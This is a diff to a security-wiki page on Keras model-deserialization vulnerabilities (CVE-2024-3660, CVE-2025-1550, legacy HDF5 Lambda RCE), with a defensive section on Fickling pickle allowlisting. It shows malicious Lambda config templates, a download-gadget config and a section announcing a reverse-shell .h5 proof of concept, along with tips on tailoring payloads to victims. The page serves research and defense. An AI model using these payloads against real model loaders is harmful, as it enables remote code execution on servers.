@@ -46,9 +46,9 @@ Historically, this exposed three primitives to an attacker crafting config.json:
 ## CVE-2024-3660 – Lambda-layer bytecode RCE
 
 Root cause:
-- Lambda.from_config() used python_utils.func_load(...) which base64-decodes and calls marshal.loads() on attacker bytes; Python unmarshalling can execute code.<sup>[[1]](#references)[[3]](#references)</sup>
+- Legacy Lambda deserialization reconstructed a Python function from attacker-controlled marshaled code: `func_load()` base64-decodes the payload, calls `marshal.loads()`, and creates a `FunctionType`. The resulting function's bytecode runs when the Lambda is invoked, and affected pre-2.13 loaders did not enforce safe-mode checks for legacy formats.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>
 
-Exploit idea (simplified payload in config.json):
+In a native Keras v3 archive, the Lambda function is represented as a `__lambda__` object whose `code` field contains base64-encoded marshaled code:<sup>[[17]](#references)[[18]](#references)</sup>
 
 ```json
 {
@@ -57,24 +57,28 @@ Exploit idea (simplified payload in config.json):
   "config": {
     "name": "exploit_lambda",
     "function": {
-      "function_type": "lambda",
-      "bytecode_b64": "<attacker_base64_marshal_payload>"
+      "class_name": "__lambda__",
+      "config": {
+        "code": "<base64(marshal.dumps(function.__code__))>",
+        "defaults": null,
+        "closure": null
+      }
     }
   }
 }
 ```
 
 Mitigation:
-- Keras enforces safe_mode=True by default. Serialized Python functions in Lambda are blocked unless a user explicitly opts out with safe_mode=False.<sup>[[1]](#references)</sup>
+- Keras enforces `safe_mode=True` by default for the native Keras v3 format. Serialized Python lambdas in `Lambda` are blocked unless a user explicitly opts out with `safe_mode=False`; this protection does not cover legacy formats in the same way.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>
 
 Notes:
 - Legacy formats (older HDF5 saves) or older codebases may not enforce modern checks, so “downgrade” style attacks can still apply when victims use older loaders.
 
-## CVE-2025-1550 – Arbitrary module import in Keras ≤ 3.8
+## CVE-2025-1550 – Arbitrary module import in Keras 3.0.0–3.8.x
 
 Root cause:
-- _retrieve_class_or_fn used unrestricted importlib.import_module() with attacker-controlled module strings from config.json.
-- Impact: Arbitrary import of any installed module (or attacker-planted module on sys.path). Import-time code runs, then object construction occurs with attacker kwargs.<sup>[[1]](#references)[[4]](#references)</sup>
+- `_retrieve_class_or_fn` used `importlib.import_module(module)` on attacker-controlled module strings from `config.json`.
+- Impact: A crafted `.keras` archive could make `Model.load_model()` import attacker-selected Python modules and functions, with import-time side effects and attacker-controlled arguments, even with `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>
 
 Exploit idea:
 
@@ -93,9 +97,9 @@ Security improvements (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)<
 
 ## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE
 
-Many production stacks still accept legacy TensorFlow-Keras HDF5 model files (.h5). If an attacker can upload a model that the server later loads or runs inference on, a Lambda layer can execute arbitrary Python on load/build/predict.<sup>[[7]](#references)</sup>
+Legacy TensorFlow-Keras deployments may still accept HDF5 model files (`.h5`). If an attacker can upload a model that the server later loads or runs inference on, an affected loader can deserialize a Lambda layer containing attacker-controlled Python, which can then execute in the application's model workflow.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>
 
-Minimal PoC to craft a malicious .h5 that executes a reverse shell when deserialized or used:
+Minimal PoC to craft a malicious .h5 whose Lambda executes a reverse shell when the target invokes the model:
 
 ```python
 import tensorflow as tf
@@ -113,7 +117,7 @@ m.save("exploit.h5")  # legacy HDF5 container
 ```
 
 Notes and reliability tips:
-- Trigger points: code may run multiple times (e.g., during layer build/first call, model.load_model, and predict/fit). Make payloads idempotent.<sup>[[7]](#references)</sup>
+- Trigger points vary by format and workflow; the referenced write-up observed the payload execute twice during prediction. Treat side effects as repeatable and make payloads idempotent.<sup>[[7]](#references)</sup>
 - Version pinning: match the victim’s TF/Keras/Python to avoid serialization mismatches. For example, build artifacts under Python 3.8 with TensorFlow 2.13.1 if that’s what the target uses.<sup>[[7]](#references)</sup>
 - Quick environment replication:
 
@@ -126,9 +130,9 @@ RUN pip install tensorflow-cpu==2.13.1
 
 ## Post-fix gadget surface inside allowlist
 
-Even with allowlisting and safe mode, a broad surface remains among allowed Keras callables. For example, keras.utils.get_file can download arbitrary URLs to user-selectable locations.<sup>[[1]](#references)</sup>
+Even with the Keras module allowlist and safe mode, allowed callables can expose side effects. For example, `keras.utils.get_file` downloads a URL and writes it under the configured cache location, making it a candidate for gadget analysis.<sup>[[1]](#references)[[19]](#references)</sup>
 
-Gadget via Lambda that references an allowed function (not serialized Python bytecode):
+Candidate Lambda configuration (validate the call signature in a controlled test):
 
 ```json
 {
@@ -136,9 +140,13 @@ Gadget via Lambda that references an allowed function (not serialized Python byt
   "class_name": "Lambda",
   "config": {
     "name": "dl",
-    "function": {"module": "keras.utils", "class_name": "get_file"},
+    "function": {
+      "module": "keras.utils",
+      "class_name": "get_file",
+      "config": null,
+      "registered_name": null
+    },
     "arguments": {
-      "fname": "artifact.bin",
       "origin": "https://example.com/artifact.bin",
       "cache_dir": "/tmp/keras-cache"
     }
@@ -147,13 +155,13 @@ Gadget via Lambda that references an allowed function (not serialized Python byt
 ```
 
 Important limitation:
-- Lambda.call() prepends the input tensor as the first positional argument when invoking the target callable. Chosen gadgets must tolerate an extra positional arg (or accept *args/**kwargs). This constrains which functions are viable.<sup>[[1]](#references)</sup>
+- `Lambda.call()` always passes the model input as the first positional argument and the configured `arguments` as keyword arguments. For `get_file`, that positional value fills `fname`; a tensor/path mismatch can make this candidate fail before any download, so it is not a guaranteed working gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>
 
 ## ML pickle import allowlisting for AI/ML models (Fickling)
 
-Many AI/ML model formats (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, older TensorFlow artifacts, etc.) embed Python pickle data. Attackers routinely abuse pickle GLOBAL imports and object constructors to achieve RCE or model swapping during load. Blacklist-based scanners often miss novel or unlisted dangerous imports.<sup>[[8]](#references)</sup>
+Many AI/ML model formats (PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn artifacts, and other Python-native formats) embed Python pickle data. The legacy Keras Lambda path above uses marshaled function bytecode instead, so it is a separate deserialization risk. Pickle opcodes can invoke attacker-controlled behavior during deserialization, including model tampering or RCE, and simple scanners can miss novel or unlisted dangerous imports.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>
 
-A practical fail-closed defense is to hook Python’s pickle deserializer and only allow a reviewed set of harmless ML-related imports during unpickling. Trail of Bits’ Fickling implements this policy and ships a curated ML import allowlist built from thousands of public Hugging Face pickles.<sup>[[8]](#references)</sup>
+A practical fail-closed defense is to hook Python’s pickle deserializer and only allow a reviewed set of harmless ML-related imports during unpickling. Trail of Bits’ Fickling implements this policy and ships a curated ML import allowlist built from thousands of public Hugging Face pickles.<sup>[[8]](#references)[[13]](#references)</sup>
 
 Security model for “safe” imports (intuitions distilled from research and practice): imported symbols used by a pickle must simultaneously:<sup>[[8]](#references)</sup>
 - Not execute code or cause execution (no compiled/source code objects, shelling out, hooks, etc.)
@@ -192,9 +200,9 @@ fickling.hook.activate_safe_ml_environment(also_allow=[
   - with fickling.check_safety(): for scoped enforcement
   - fickling.load(path) / fickling.is_likely_safe(path) for one-off checks
 
-- Prefer non-pickle model formats when possible (e.g., SafeTensors). If you must accept pickle, run loaders under least privilege without network egress and enforce the allowlist.
+- Prefer non-pickle model formats when possible (e.g., SafeTensors).<sup>[[15]](#references)</sup> If you must accept pickle, run loaders under least privilege without network egress and enforce the allowlist.
 
-This allowlist-first strategy demonstrably blocks common ML pickle exploit paths while keeping compatibility high. In ToB’s benchmark, Fickling flagged 100% of synthetic malicious files and allowed ~99% of clean files from top Hugging Face repos.<sup>[[8]](#references)</sup>
+This allowlist-first strategy demonstrably blocks common ML pickle exploit paths while keeping compatibility high. In ToB’s benchmark, Fickling flagged 100% of synthetic malicious files and allowed ~99% of clean files from top Hugging Face repos.<sup>[[8]](#references)[[10]](#references)</sup>
 
 
 ## Researcher toolkit
@@ -256,19 +264,27 @@ print("\n".join(sorted(candidates)[:200]))
 Feed crafted dicts directly into Keras deserializers to learn accepted params and observe side effects.<sup>[[1]](#references)</sup>
 
 ```python
-from keras import layers
+import keras
 
 cfg = {
   "module": "keras.layers",
   "class_name": "Lambda",
   "config": {
     "name": "probe",
-    "function": {"module": "keras.utils", "class_name": "get_file"},
-    "arguments": {"fname": "x", "origin": "https://example.com/x"}
+    "function": {
+      "module": "keras.utils",
+      "class_name": "get_file",
+      "config": null,
+      "registered_name": null
+    },
+    "arguments": {
+      "origin": "https://example.com/x",
+      "cache_dir": "/tmp/keras-cache"
+    }
   }
 }
 
-layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
+layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
 ```
 
 3) Cross-version probing and formats
@@ -297,5 +313,9 @@ Repeat tests across codebases and formats (.keras vs legacy HDF5) to uncover reg
 - [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
 - [14] [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
 - [15] [SafeTensors project](https://github.com/safetensors/safetensors)
+- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers Allow Arbitrary Code Injection](https://kb.cert.org/vuls/id/253266)
+- [17] [Keras Lambda layer source (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
+- [18] [Keras Python utilities source (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
+- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
 
 {{#include ../../banners/hacktricks-training.md}}
